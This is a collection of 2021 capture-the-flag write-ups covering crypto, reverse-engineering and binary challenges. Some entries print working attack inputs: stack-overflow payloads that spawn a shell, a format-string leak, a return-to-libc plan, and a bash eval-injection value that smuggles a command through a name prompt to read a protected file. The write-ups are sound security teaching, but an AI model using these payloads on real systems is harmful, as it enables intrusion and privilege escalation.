<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-dystobic
description: CTF writeups and security challenges by dystobic.
---

# Writeups by dystobic

Source repository: `/repos/dystobic`

## Repository Index

- writeups/README.md
- writeups/rev/Giftwrap/README.md
- writeups/rev/seed/README.md
- writeups/pwn/Flag Checker Baby/README.md
- writeups/pwn/Minimelfistic/README.md
- writeups/pwn/Mr Snowy/README.md
- writeups/pwn/Naughty List/README.md
- writeups/pwn/Sleigh/README.md
- writeups/pwn/badseed/README.md
- writeups/crypto/Boombastic/CHALLENGE.md
- writeups/crypto/Boombastic/README.md
- writeups/crypto/Break me!/README.md
- writeups/crypto/Common Mistake/README.md
- writeups/crypto/Crypto Warm up/README.md
- writeups/crypto/Deoxyencoded Nucleic Acid/README.md
- writeups/crypto/Honeycomb/README.md
- writeups/crypto/Madras/README.md
- writeups/crypto/Meet Me Halfway/README.md
- writeups/crypto/Missing Reindeer/README.md
- writeups/crypto/N1TP/CHALLENGE.md
- writeups/crypto/N1TP/README.md
- writeups/crypto/RSA - 1/README.md
- writeups/crypto/RSA - 2/README.md
- writeups/crypto/RSA - 3/README.md
- writeups/crypto/Result/README.md
- writeups/crypto/Substitution Cipher I/README.md
- writeups/crypto/XMAS Spirit/README.md
- writeups/crypto/xorpals/README.md
- writeups/2021/SSTF/SW Expert Academy/CHALLENGE.md
- writeups/2021/SSTF/SW Expert Academy/README.md
- writeups/2021/KillerQueen/Deoxyencoded Nucleic Acid/README.md
- writeups/2021/KillerQueen/jazz/README.md
- writeups/2021/KillerQueen/tweetybirb/README.md
- writeups/2021/HacktivityCon CTF/Hexahedron/CHALLENGE.md
- writeups/2021/HacktivityCon CTF/Hexahedron/README.md
- writeups/2021/HacktivityCon CTF/N1TP/CHALLENGE.md
- writeups/2021/HacktivityCon CTF/N1TP/README.md
- writeups/2021/FwordCTF/Boombastic/CHALLENGE.md
- writeups/2021/FwordCTF/Boombastic/README.md
- writeups/2021/FwordCTF/devprivops/CHALLENGE.md
- writeups/2021/FwordCTF/devprivops/README.md
- writeups/2021/DownUnderCTF/Break me!/README.md
- writeups/2021/DownUnderCTF/Leaking like a sieve/README.md
- writeups/2021/DownUnderCTF/Substitution Cipher I/README.md
- writeups/2021/DownUnderCTF/deadcode/README.md
- writeups/2021/DownUnderCTF/outBackdoor/README.md
- writeups/2021/DeconstruCTF/RSA - 1/README.md
- writeups/2021/DeconstruCTF/RSA - 2/README.md
- writeups/2021/DeconstruCTF/RSA - 3/README.md
- writeups/2021/DeconstruCTF/Reject humanity return to libc/README.md
- writeups/2021/DAMCTF/cookie-monster/README.md
- writeups/2021/DAMCTF/seed/README.md
- writeups/2021/DAMCTF/xorpals/README.md
- writeups/2021/ASIS CTF Quals/Crypto Warm up/README.md
- writeups/2021/ASIS CTF Quals/Madras/README.md
- writeups/2021/ALLES! CTF/Pyimplant/CHALLENGE.md
- writeups/2021/ALLES! CTF/Pyimplant/README.md

## Writeup Content


### File: writeups/2021/ALLES! CTF/Pyimplant/README.md

## Intro
**Pyimplant** was a misc challenge at ALLES! CTF 2021.  

You were given the bytecode of a python script which had been altered in some way
as its SHA256 checksum apparently doesn't match the original compiled script anymore.

## Investigation
The most natural step was to decompile the bytecode and compare the source with the original. I used
`decompyle6` for that. But except for a missing docstring they were basically the same. So the flag must
be hidden somewhere in the bytecode itself.

## Solution
I dumped the bytecode using `xxd` and as I looked through the ASCII representation I recognized
the flag format.
```
000002f0: 0383 0144 4190 035d 407d 0274 0174 0283  ...DA..]@}.t.t..    | A
00000300: 0101 4c74 0364 047c 0017 4c64 0517 4583  ..Lt.d.|..Ld..E.    | L L E
00000310: 0101 5374 0483 007d 0374 027c 0319 2164  ..St...}.t.|..!d    | S !
00000320: 066b 0272 567c 0074 027c 033c 7b7c 0164  .k.rV|.t.|.<{|.d    | {
00000330: 0737 707d 016e 0a74 0364 0883 0101 7971  .7p}.n.t.d....yq
00000340: 147c 0164 096b 0590 0372 2874 0264 0a19  .|.d.k...r(t.d..
00000350: 3774 0264 0b19 6804 3003 6e6b 026f 9274  7t.d..h.0.nk.o.t
00000360: 0264 0c19 5f04 6203 796b 026f 9264 066b  .d.._.b.yk.o.d.k
00000370: 036e 0402 7401 3372 be74 0174 0283 0101  .n..t.3r.t.t....
00000380: 6374 0364 0d83 0101 6f74 0364 0e7c 0017  ct.d....ot.d.|..
00000390: 6464 0f17 3383 0101 5f50 7390 026e 6a74  dd..3..._Ps..njt
000003a0: 0264 1019 3374 0264 1119 6304 7203 336b  .d..3t.d..c.r.3k
000003b0: 026f e674 0264 1219 7404 7303 7d6b 026f  .o.t.d..t.s.}k.o`    | }
```

So I copied the passage into `vim` and removed all characters which I thought wouldn't be part of the flag,
which left me with
```
ALLES!{d7pntdyqdkrtd7tdh0nkotd_bykodknt3rttctdotddd3_Psnjtd3tdcr3kotdts}
```

I then removed character by character, trying out a few combinations of which I thought they would make sense. I got lucky at some point with the flag being

> ALLES!{py7h0n_byt3cod3_s3cr3ts}

##### Edit
Only after the event ended I learned about python 3.6 opcodes always occupying two bytes so that
opcodes without an argument leave space to hide 1 byte. There even is a tool called [stegosaurus](https://github.com/AngelKitty/stegosaurus) for
embedding and reading payloads in python bytecode, which I could have used instead.



### File: writeups/2021/ASIS CTF Quals/Crypto Warm up/README.md

___
# Crypto Warm up
_(crypto;warmup, 41 points, 147 solves)_

Recovering secrets is hard, but there are always some easy parts to do it!

[Warmup.py](./Warmup.py) | [output.txt](./output.txt)
___



### File: writeups/2021/ASIS CTF Quals/Madras/README.md

___
# Madras
_(crypto, 59 points, 88 solves)_

Madras is a great place to learn the occult! The occult, is a category of supernatural beliefs and practices which generally fall outside the scope of religion and science. Do you want to go Madras?

[Madras.py](./Madras.py) | [output.txt](./output.txt)
___



### File: writeups/2021/DAMCTF/cookie-monster/README.md

___
# cookie-monster
_(pwn, 406 points, 153 solves)_

Do you like cookies? I like cookies.

nc chals.damctf.xyz 31312

[cookie-monster](./cookie-monster)
___



### File: writeups/2021/DAMCTF/seed/README.md

___
# seed
_(rev, 249 points, 342 solves)_

Having a non-weak seed when generating "random" numbers is super important! Can you figure out what is wrong with this PRNG implementation?

`seed.py` is the Python script used to generate the flag for this challenge. `log.txt` is the output from the script when the flag was generated.

What is the flag?

[seed.py](./seed.py) | [log.txt](./log.txt)
___



### File: writeups/2021/DAMCTF/xorpals/README.md

___
# xorpals
_(crypto, 188 points, 435 solves)_

One of the 60-character strings in the provided file has been encrypted by single-character XOR. The challenge is to find it, as that is the flag.

Hint: Always operate on raw bytes, never on encoded strings. Flag must be submitted as UTF8 string.

[flags.txt](./flags.txt)
___



### File: writeups/2021/DeconstruCTF/RSA - 1/README.md

___
# RSA - 1
_(crypto, 150 points, 191 solves)_

I have a lot of big numbers. Here, have a few!

[big_numbers.txt](./big_numbers.txt)
___

## Investigation
Obviously, this is a RSA challenge and despite they are calling them big_numbers, those numbers aren't _that_ big. Therefore, `n` can be factored out with reasonable efforts.

## Solution
Someone already did the factorization of `n` and so I was able to fetch the corresponding `p` and `q` from [factordb](http://factordb.com/). From that point I just
followed basic schoolbook RSA algorithm to derive `d` and decrypt `c`.

See [exploit](./exploit.py) for an implementation in python.

> dsc{t00_much_m4th_8898}




### File: writeups/2021/DeconstruCTF/RSA - 2/README.md

___
# RSA - 2
_(crypto, 150 points, 126 solves)_

Hey I heard you have a supercomputer at home. This is taking too long to compute on my computer. Could you take a look on yours?
I'm sure its a lot more precise than mine is, and faster too!

[supercomputer_food](./supercomputer_food)
___

## Investigation
The numbers are obviously from the [RSA](https://en.wikipedia.org/wiki/RSA_(cryptosystem)) encryption scheme. What immediately catches the eye here is the
very small value for `e`. Also, `c` is relatively small compared to `n`. So there's a chance that `m^e = c < n` and if no padding is used then the original message
can be recovered by just reversing the operation with `m = c^(1/e)`.

## Solution
See [exploit](./exploit.py) for an implementation in python.

> dsc{t0-m355-w1th-m4th-t4k35-4-l0t-0f-sp1n3}



### File: writeups/2021/DeconstruCTF/RSA - 3/README.md

___
# RSA - 3
_(crypto, 250 points, 85 solves)_

Alright, this is the big leagues. You have someone's Public Key. This isn't unusual, if you want to send someone an encrypted message, you have to have thier public key.
Your job is to evaluate this public key, and obtain the value of the secret exponent or decryption exponent (The value of "d" in an RSA encryption).

Wrap the number that you find with dsc{<number>}!

[mykey.pub](./mykey.pub)
___

## Investigation
From the challenge description it can be deduced that `mykey.pub` is a [RSA](https://en.wikipedia.org/wiki/RSA_(cryptosystem)) public key.
So I first extracted the modulus `n` and public exponent `e` from it with `openssl rsa -in mykey.pub -noout -text -pubin`. Looking at a _very_ big `e`
I took an educated guess that maybe `d` would be sufficently small (namely `d < 1/3n^(1/4)`), which could then be exploited by leveraging
[Wiener's Attack](https://en.wikipedia.org/wiki/Wiener%27s_attack).

## Solution
Using Wiener's Attack based on continued fractions and their convergents I was able to recover `d` from the public key.

See [exploit](./exploit.py) for an implementation in python.

> dsc{6393313697836242618414301946448995659516429576261871356767102021920538052481829568588047189447471873340140537810769433878383029164089236876209147584435733}



### File: writeups/2021/DeconstruCTF/Reject humanity return to libc/README.md

___
# Reject humanity return to libc
_(binary, 250 points, 32 solves)_

Hello Agent,  
`<REDACTED>`, a bio-terrorist organisation located in the west have stolen serum Id:`<Redacted>` from our special research facility.
The serum has the ability to reverse evolution of a species by 100's of years and can return humans back to their former monkey selves.
We have learnt that the organisation prepares to release the serum as a gas form in unknown public area using a dipenser.The only information we have about the dispenser is the login portal info,the login program running, and its libc version

Your mission is to break in and disarm the dispenser. The connection info,login program, and the libc library is given below. Be warned the organisation are known pranksters.

nc overly.uniquename.xyz 2052 

[challenge](./challenge) | [libc-2.31.so](./lib/x86_64-linux-gnu/libc-2.31.so) | [dispenser_login.c](./dispenser_login.c)
___

## Investigation
Looking at the provided [source](./dispenser_login.c) of the program we can spot a
common buffer overflow vulnerability in the `disarm_dispenser` function caused by
the insecure `gets` function.
The program is pretty minimal and does not contain any other function to use within our exploit - so we are going to leverage
a classical [return-to-libc attack](https://en.wikipedia.org/wiki/Return-to-libc_attack).

The exploit works in two stages:
1. Pretending that ASLR is enabled on the target system, we first leak the absolute address
of `puts@libc` in order to derive the base address of `libc` from it at runtime.
2. Using the base address of `libc` we calculate the absolute addresses of `system`
and `/bin/sh` in `libc` to spawn a shell.

As PIE is disabled on the binary and the [libc](./lib/x86_64-linux-gnu/libc-2.31.so) in use on the target system is provided, all the addresses,
offsets, strings and ROP gadgets needed for the exploit can be easily obtained in advance (e.g. using `objdump`, `strings` and `ROPGadget`).

## Solution
See [exploit](./exploit.py) for an automation of the exploit written in python.

After having access to the target system, there's a `disarm_dispencer.sh` script in the current working directory. Execute it and it prints out the flag.

> dsc{r37URN_70_M0nk3}

###### Disclaimer
Not using some of `pwntools` functionality in the exploit like ELF loading & dynamically finding addresses and offsets or building ROP chains
was intentional. I explicitely wanted to do some manual work and preparation of the attack in order
to consolidate my knowledge.



### File: writeups/2021/DownUnderCTF/Break me!/README.md

___
# Break me!
_(crypto, easy, 100 points, 163 solves)_

AES encryption challenge.

Author: 2keebs

`nc pwn-2021.duc.tf 31914`

[aes-ecb.py](./aes-ecb.py)
___

## Investigation
We are faced with an [AES-ECB](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_codebook_(ECB)) encryption oracle here which - given some plaintext _**P**_ - encrypts

```
flag + P + k + padding
```

where _**k**_ is the secret key used in the encryption scheme.

## Solution
Because we control _**P**_, we can leak the key bytes one-after-another by leveraging a [well-known](https://crypto.stackexchange.com/a/46921) chosen plaintext/brute-force attack. As soon as the key is reconstructed it can then be used to
decrypt the first blocks independently resulting in our flag. For this particular challenge, key memoization and a reconnection mechanism had to be implemented as the remote host did from time to time just close the connection. But, I was too lazy for that and just manually updated the leaked key bytes I had so far, starting over again from that point.

See [exploit](./exploit.py) for an implementation of the attack written in python.

> DUCTF{ECB_M0DE_K3YP4D_D474_L34k}}



### File: writeups/2021/DownUnderCTF/Leaking like a sieve/README.md

___
# Leaking like a sieve
_(pwn, beginner, 100 points, 419 solves)_

This program I developed will greet you, but my friend said it is leaking data like a sieve, what did I forget to add?

Author: xXl33t_h@x0rXx

`nc pwn-2021.duc.tf 31918`

[hellothere](./hellothere)
___

## Investigation
`checksec` showed that NX and PIE are enabled for the binary. Following the `ltrace` I learned the flow of the program and found no potential
buffer overflow vulnerability at first sight. I loaded the program into `gdb` and disassembled the `main` function, which was the only function of interest here.

```
...
0x0000000000001201 <+41>:	lea    rsi,[rip+0xe00]        # 0x2008  "r"
0x0000000000001208 <+48>:	lea    rdi,[rip+0xdfb]        # 0x200a  "./flag.txt"
0x000000000000120f <+55>:	call   0x1080 <fopen@plt>
...
0x000000000000125d <+133>:	lea    rax,[rbp-0x50]
0x0000000000001261 <+137>:	mov    esi,0x20
0x0000000000001266 <+142>:	mov    rdi,rax
0x0000000000001269 <+145>:	call   0x1070 <fgets@plt>
0x000000000000126e <+150>:	lea    rdi,[rip+0xe1c]        # 0x2091  "\nHello there, "
0x0000000000001275 <+157>:	mov    eax,0x0
0x000000000000127a <+162>:	call   0x1060 <printf@plt>
0x000000000000127f <+167>:	lea    rax,[rbp-0x50]
0x0000000000001283 <+171>:	mov    rdi,rax
0x0000000000001286 <+174>:	mov    eax,0x0
0x000000000000128b <+179>:	call   0x1060 <printf@plt>
...
```

We can see here that the program reads in the flag from a file somewhere in the beginning. Later, it asks the user for input, which gets stored at `rbp-0x50`,
and prints it out again using `printf`. Using this input as the first and only parameter to `printf` a format string vulnerability
is introduced. We can verify this by inputting some format strings like `%p %p %p %p %p %p %p %p` and see that memory addresses from the programs stack get leaked.

```
(gdb) r
...
What is your name?
%p %p %p %p %p %p %p %p

Hello there, 0x7fffffffbd30 (nil) 0x7ffff7ed6387 0x7fffffffde60 (nil) 0x7fffffffde80 0x5555555592a0 0x7025207025207025

What is your name?
```

## Solution
As it happens the flag is the sixth address stored in the stack so we can print that out by inputting `%6$s`. This format string will interpret the sixth
address on the stack as a string and print it out. Et voila!

```
(gdb) r
...
What is your name?
%6$s

Hello there, DUCTF{f0rm4t_5p3c1f13r_m3dsg!}
```

See [exploit](./exploit.py) for an automation of the exploit written in python.

> DUCTF{f0rm4t_5p3c1f13r_m3dsg!}



### File: writeups/2021/DownUnderCTF/Substitution Cipher I/README.md

___
# Substitution Cipher I
_(crypto, beginner, 100 points, 362 solves)_

Just a simple substitution cipher to get started...

Author: joseph#8210

[substitution-cipher-i.sage](substitution-cipher-i.sage) | [output.txt](output.txt)
___

## Investigation
The encryption scheme found in the source is a trivial substitution cipher based on the polynomial

```
13x^2 + 3x + 7
```

where `x` is substituted by each plaintext byte and the solution of the resulting mathematical expression is the corresponding
ciphertext byte interpreted as a unicode character. Therefore, decrypting a ciphertext byte `y` is as easy as solving the
quadratic equation

```
13x^2 + 3x + 7 = y
```

## Solution
I solved the quadratic equation for each ciphertext byte after `x` using the quadratic formula `(-b + sqrt(b^2 - 4ac)) / 2a`
ignoring all the negative solutions as I know the plaintext consisted of only positive byte values.  

See [exploit](./exploit.py) for an implementation written in python.

> DUCTF{sh0uld'v3_us3d_r0t_13}



### File: writeups/2021/DownUnderCTF/deadcode/README.md

___
# deadcode
_(pwn, beginner, 100 points, 528 solves)_

I'm developing this new application in C, I've setup some code for the new features but it's not (a)live yet.

Author: xXl33t_h@x0rXx

`nc pwn-2021.duc.tf 31916`

[deadcode](./deadcode)
___

## Investigation
`checksec` showed that besides NX no other stack mitigations are present. Following the `ltrace` I learned the relatively simple flow of the program and found a
potential buffer overflow vulnerability because the insecure `gets` functions is used to capture user input. I loaded the program into `gdb` and disassembled
the `main` function, which is the only one as `info functions` showed.

```
...
0x00000000004011c7 <+50>:   lea    rax,[rbp-0x20]
0x00000000004011cb <+54>:   mov    rdi,rax
0x00000000004011ce <+57>:   mov    eax,0x0
0x00000000004011d3 <+62>:   call   0x401060 <gets@plt>
0x00000000004011d8 <+67>:   mov    eax,0xdeadc0de
0x00000000004011dd <+72>:   cmp    QWORD PTR [rbp-0x8],rax
0x00000000004011e1 <+76>:   jne    0x401200 <main+107>
...
0x00000000004011ef <+90>:   lea    rdi,[rip+0xed5]        # 0x4020cb  "/bin/sh"
0x00000000004011f6 <+97>:   mov    eax,0x0
0x00000000004011fb <+102>:  call   0x401050 <system@plt>
...
```
We can see here that whatever resides at `rbp-0x8` is compared to `0xdeadc0de` and if equals, `system("/bin/sh")` is executed. So the goal is to overflow
the buffer at `rbp-0x20` and write `0xdeadc0de` to `rbp-0x8` - which initially is set to `0` - to spawn us a shell. Let's set a breakpoint right before the compare and run the program
with `AAAAAAAA` as input.  

```
(gdb) r
...
Breakpoint 1, 0x00000000004011d8 in main ()
(gdb) x/8x $rbp-0x20
0x7fffffffdec0:	0x41414141	0x41414141	0x00401000	0x00000000
0x7fffffffded0:	0xffffdfd0	0x00007fff	0x00000000	0x00000000
(gdb) p $rbp-0x8
$3 = (void *) 0x7fffffffded8
```

So we have to overwrite the contents of address `0x7fffffffded8` (thats's where `rbp-0x8` points to). The `AAAAAAAA`'s we typed in were sent straight to the buffer at
`0x7fffffffdec0` (that's where `rbp-0x20` points to) as we can see by the eight `0x41`'s (ASCII value for 'A'). From here we learn we have to fill the buffer
with 24 bytes and then get to write `0xdeadc0de` to our target address.  

## Solution
Let's pull off a quick ruby exploit for proof of concept.

```
(gdb) r <<< $(ruby -e 'print "A"*24 + "\xde\xc0\xad\xde"')
...
Breakpoint 1, 0x00000000004011d8 in main ()
(gdb) x/8x $rbp-0x20
0x7fffffffdec0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffded0:	0x41414141	0x41414141	0xdeadc0de	0x00000000
(gdb) x/x $rbp-0x8
0x7fffffffded8:	0xdeadc0de
(gdb) c
Continuing.


Maybe this code isn't so dead...
```

... and we've successfully overflowed the buffer satisfying the compare to get our shell. From here we can just execute `cat flag.txt`
to get the flag.

See [exploit](./exploit.py) for an automation of the exploit written in python.  

> DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}




### File: writeups/2021/DownUnderCTF/outBackdoor/README.md

___
# outBackdoor
_(pwn, easy, 100 points, 361 solves)_

Fool me once, shame on you. Fool me twice, shame on me.

Author: xXl33t_h@x0rXx

`nc pwn-2021.duc.tf 31921`

[outBackdoor](./outBackdoor)
___

## Investigation
`checksec` showed that besides NX no other stack mitigations are present, especially no PIE. Following the `ltrace` I learned the relatively simple flow of the program and found
a potential buffer overflow vulnerability because the insecure `gets` functions is used to capture user input. I loaded the program into `gdb` and found - next
to the `main` function - another interesting function called `outBackdoor`.

```
(gdb) info functions
...
0x0000000000401195  main
0x00000000004011d7  outBackdoor
...
```

```
(gdb) disas outBackdoor
...
0x00000000004011e7 <+16>:	lea    rdi,[rip+0xedf]        # 0x4020cd  "/bin/sh"
0x00000000004011ee <+23>:	mov    eax,0x0
0x00000000004011f3 <+28>:	call   0x401050 <system@plt>
...
```

```
(gdb) disas main
...
0x00000000004011bf <+42>:	lea    rax,[rbp-0x10]
0x00000000004011c3 <+46>:	mov    rdi,rax
0x00000000004011c6 <+49>:	mov    eax,0x0
0x00000000004011cb <+54>:	call   0x401060 <gets@plt>
...
```

The disassembly of the functions reveals we can get a shell from `outBackdoor` - if we are able to call it, as it isn't called from anywhere in `main`.
So the goal is to overflow the buffer in the `main` function and overwrite the return address with the address of the `outBackdoor` function. Let's set
a breakpoint right after the `gets` and run the program with `AAAAAAAA` as input.

```
(gdb) r
...
Breakpoint 1, 0x00000000004011d0 in main ()
(gdb) info frame
Stack level 0, frame at 0x7fffffffdee0:
 rip = 0x4011d0 in main; saved rip = 0x7ffff7e0cb75
 Arglist at 0x7fffffffded0, args: 
 Locals at 0x7fffffffded0, Previous frame's sp is 0x7fffffffdee0
 Saved registers:
  rbp at 0x7fffffffded0, rip at 0x7fffffffded8
(gdb) x/10x $rbp-0x10
0x7fffffffdec0:	0x41414141	0x41414141	0x00000000	0x00000000
0x7fffffffded0:	0x00000000	0x00000000	0xf7e0cb75	0x00007fff
0x7fffffffdee0:	0xffffdfc8	0x00007fff
```

We see that the buffer at `rbp-0x10` which is at `0x7fffffffdec0` itself takes 16 bytes of which we filled 8 bytes with the `AAAAAAAA`'s we typed in.
Then follows the `rbp` at `0x7fffffffded0`. On a 64-bit system this address takes another 8 bytes and directly after follows the `main` function's return
address we want to overwrite with the address of `outBackdoor` which is `0x00000000004011d7` - lucky for us the binary isn't PIE enabled.  

So we can just
- fill the buffer at `rbp-0x10` with 16 bytes
- overwrite `rbp` with 8 bytes
- overwrite the return address of `main` with `0x00000000004011d7` making `rip` point to `outBackdoor`.

## Solution
Let's pull off a quick ruby exploit for proof of concept.

```
(gdb) r < <(ruby -e 'print "A"*16 + "B"*8 + "\xd7\x11\x40\x00\x00\x00\x00\x00"')
...
Breakpoint 1, 0x00000000004011d0 in main ()
(gdb) x/10x $rbp-0x10
0x7fffffffdec0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffded0:	0x42424242	0x42424242	0x004011d7	0x00000000
0x7fffffffdee0:	0xffffdf00	0x00007fff
(gdb) c
Continuing.


W...w...Wait? Who put this backdoor out back here?
```
___
##### Note
When running the exploit remotely the program segfaults because of the so called [movaps issue](https://ropemporium.com/guide.html).
`movaps` is an assembly instruction that is used in some syscalls like `do_system()` and it expects the stack to be 16-byte aligned. Because we just brutally overwrote the return address of `main` instead of using a clean `call outBackdoor` our stack at the point of calling into `system()` is not aligned correctly.
To deal with that I used the address of `outBackdoor + 1` in the exploit instead - skipping the first `push rbp` instruction and therefore keeping the stack alignment intact.
___

See [exploit](./exploit.py) for an automation of the exploit written in python.

> DUCTF{https://www.youtube.com/watch?v=XfR9iY5y94s}



### File: writeups/2021/FwordCTF/Boombastic/README.md

## Intro
**Boombastic** was a crypto challenge at FwordCTF 2021.  

Following Kerkhoff's principle you were given access to the [source](boombastic.py) of a program mimicing some kind of cinema
where you could either withdraw some ordinary tickets at random or actually enter the cinema if you provide a special VIP ticket.

Of course, we want to enter the cinema!

## Investigation
The ticket generation function in use derives a ticket `T = {r,s,p}` from a message `M` by calculating  
```
r = (y^2-1) (x^2 )^(-1)     (mod p)
s = (y+1) x^(-1)            (mod p)
```
where  
- `p` is a random prime
- `x ∈ Z_p` is a random secret 
- `y` is the numerical representation of `M` obtained by its SHA256 hash value

We are also given an encryption oracle from which we can obtain random tickets generated by the program.  

## Solution
The weakness here is that the same secret `x` is being re-used in all tickets. For we know all the other parameters involved in ticket generation, if we know `x`, we can forge any ticket - as it's the same in every ticket. Thus, given the encryption oracle we obtain a random ticket `T = {r,s,p}` and derive `x` as follows:  
```
s = (y+1) x^(-1)                (mod p)

=> x^(-1) = s/(y+1)             (mod p) // (1)
=> x = (s/(y+1)^(-1)            (mod p) // (2)

r = (y^2-1) (x^2 )^(-1)         (mod p)
  = (y^2-1) x^(-1) x^(-1)       (mod p) // substitute with (1)
  = (y^2-1) (s/(y+1))^2         (mod p)

=> y = (-s^2-r) (r-s^2)^(-1)    (mod p) // (3)

substitute (2) with (3)
```

A last quick look into the [source](boombastic.py) tells us the message `M` to be used for the VIP ticket is *Boombastic*.  

Now we have all we need to craft us some VIP ticket by ourselves and enter the cinema!

See [exploit](exploit.py) for an implementation.

> Here is your flag : FwordCTF{4ct_l1k3_a_V1P_4nd_b3c0m3_a_V1P}, enjoy the movie sir



### File: writeups/2021/FwordCTF/devprivops/README.md

## Intro
**devprivops** was a bash challenge at FwordCTF 2021.  

You were given access to a linux machine through SSH as _user1_. In the home directory of the user two files of interest can be found - a [shell script](devops.sh) and a `flag.txt`. Both files belong to root and only another user on the system called _user-privileged_ was granted read access to the flag.

```
user1@da8cb1333b60:/home/user1$ ls -la
total 32
drwxrwxr-t 1 root  user1           4096 Aug 27 22:44 ./
drwxr-xr-x 1 root  root            4096 Aug 27 22:43 ../
-rw-r--r-- 1 user1 user1            220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 user1 user1           3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 user1 user1            807 Feb 25  2020 .profile
-rwxr-xr-x 1 root  user-privileged  945 Aug 27 22:09 devops.sh*
-rwxr----- 1 root  user-privileged   67 Aug 27 22:09 flag.txt*
```

Let's escalate!

## Investigation
By inspecting the shell script we learn that we can supply two parameters `-d` and `-p`.  

The `-d` parameter block essentially lets us input the name of a function which gets defined by `eval` and exported afterwards.

```bash
if [[ deploy -eq 1 ]];then
        echo -ne "Please enter your true name if you are a shinobi\n"  
        read -r name
        eval "function $name { terraform init &>/dev/null && terraform apply &>/dev/null ; echo \"It should be deployed now\"; }"
        export -f $name
fi
```

Unfortunately, it seems we can never run it since it's impossible to get past the admin check.

```bash
isAdmin=0
# Ofc only admins can deploy stuffs o//
if [[ $isAdmin -eq 1 ]];then
        $name
fi
```

Or can we?

The evaluation of the `-p` parameter block follows directly after and prints out our current permissions by calling `id`.

```bash
if [[ $permission -eq 1 ]];then
        echo "You are: " 
        id
fi
```

## Solution
A quick `sudo -l` reveals we have the ability to execute [devops.sh](devops.sh) as the _user-privileged_.

```
user1@7c47d98c8907:/home/user1$ sudo -l
Matching Defaults entries for user1 on 7c47d98c8907:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user1 may run the following commands on 7c47d98c8907:
    (user-privileged) NOPASSWD: /home/user1/devops.sh
```

So we execute the script as `sudo -u user-privileged ./devops.sh -d -p` and input the payload `id { cat flag.txt; }; #`, overwriting the `id` function with our malicious one. When the `-p` parameter block gets evaluated afterwards and our `id` is called, the flag gets exposed!

> FwordCTF{W00w_KuR0ko_T0ld_M3_th4t_Th1s_1s_M1sdirecti0n_BasK3t_FTW}

##### Edit
A cleaner and simpler payload not relying on the execution of the `-p`parameter block would have been `f { cat flag.txt; }; f; #` evaluating our malicious function immediately.



### File: writeups/2021/HacktivityCon CTF/Hexahedron/README.md

## Intro
**Hexahedron** was a crypto challenge at H@cktivityCon 2021 CTF.  

You were given a file containing three hexadecimal numbers `n`, `e` and `c`.

## Investigation
The numbers look much like the modulus, public key and a ciphertext from the [RSA](https://en.wikipedia.org/wiki/RSA_(cryptosystem)) encryption scheme.
What immediately catches the eye here is the very small value for `e`. Also, `c` is relatively small compared to `n`. So there's a chance that `m^e = c < n` and if no padding is used then the original message can be recovered by just reversing the operation with `m = c^(1/e)`.

## Solution
See [exploit](./exploit.py) for a python implementation calculating `m = c^(1/e)` and parsing the flag from the result.

> flag{080eaeb0d8f724bcb542562b3bb708e5}



### File: writeups/2021/HacktivityCon CTF/N1TP/README.md

## Intro
**N1TP** was a crypto challenge at H@cktivityCon 2021 CTF.  

You were given an encrypted flag and an encryption oracle.

## Investigation
From the context of the challenge one can deduce the applied encryption scheme here is a [One-Time Pad](https://en.wikipedia.org/wiki/One-time_pad). A OTP is cryptographically secure unless being re-used. If so, given an encryption oracle and a ciphertext `C = M ^ K` where `K` is the OTP , one can recover the original message `M` by simply calculating `C1 = M1 ^ K` and then:  

```
C ^ C1 ^ M1 = M ^ K ^ M1 ^ K ^ M1 = M
```

## Solution
I fetched the encrypted flag and the ciphertext for the plaintext I provided and predicted that the OTP would be re-used. Applying the aforementioned formula proved me right and rewarded me with the flag.

> flag{9276cdb76a3dd6b1f523209cd9cd9c0a11b}

##### Edit
I learned after the event that because we know the original message starts with the word `flag{` I could have chosen a plaintext for the oracle starting with the same word to learn that the OTP is being re-used here - the first bytes of the two ciphertexts are then equal and therefore the OTP is re-used.



### File: writeups/2021/KillerQueen/Deoxyencoded Nucleic Acid/README.md

___
# Deoxyencoded Nucleic Acid

[dna1.txt](./dna1.txt)
___

# Investigation

The challenge description was emphasizing that the _four_ nucleobases form an encoding. I recognized that the length of the dna sequence is 0 mod 4 and took an educated guess that a sequence of _four_ nucleobases encodes a character. As a character has 1 Byte I predicted `A`, `G`, `C` and `T` each could represent two bits. I know the flag starts with the letter `k` whose ordinal value is binary `01 10 10 11` and the dna sequence starts with `TGGC` - which matches

- `T` with `01`
- `G` with `10`
- `C` with `11`

just perfectly, leaving `A` to represent `00`.

# Solution

Interpreting each quadrupel of nucleobases as the ordinal value of a character by concatenation of their binary values yields the flag.

See [solve](./solve.py) for an implementation in python.

> kqctf{its_basica11y_base_four}



### File: writeups/2021/KillerQueen/jazz/README.md

___
# jazz
_(rev)_

9xLmMiI2znmPam'D_A_1:RQ;Il\*7:%i".R<

[challenge.jar](./challenge.jar)
___



### File: writeups/2021/KillerQueen/tweetybirb/README.md

___
# Tweetybirb
_(pwn, 269 points)_

Pretty standard birb protection (nc 143.198.184.186 5002)

[tweetybirb](./tweetybirb)
___

# Investigation

Running `checksec` against the binary verifies the hint in the challenge description that stack canaries are in use. An `ltrace` on the binary reveals a format string vulnerability by improper use of `printf` as well as a buffer overflow vulnerability caused by the unsafe `gets` function. Reading the symbols from the binary we find a `win` function within yielding the flag when executed.

# Solution

Leak the stack canary via the format string. Then use it before overwriting the return address of `main` with the address of `win` via the buffer overflow.

see [exploit](./exploit.py) for an automation of the exploit written in python.

> kqctf{tweet_tweet_did_you_leak_or_bruteforce_..._plz_dont_say_you_tried_bruteforce}



### File: writeups/2021/SSTF/SW Expert Academy/README.md

## Intro
**SW Expert Academy** was a web challenge at Hacker's Playground 2021 by SSTF.  

You were given a URL where you should prove your algorithmic skills by solving some dice roll problem. At the bottom of the page is a text field where you can inject C-Code into the body of a main-function. Upon submitting the form, your algorithm is executed on the server side and tested against some input.

## Investigation
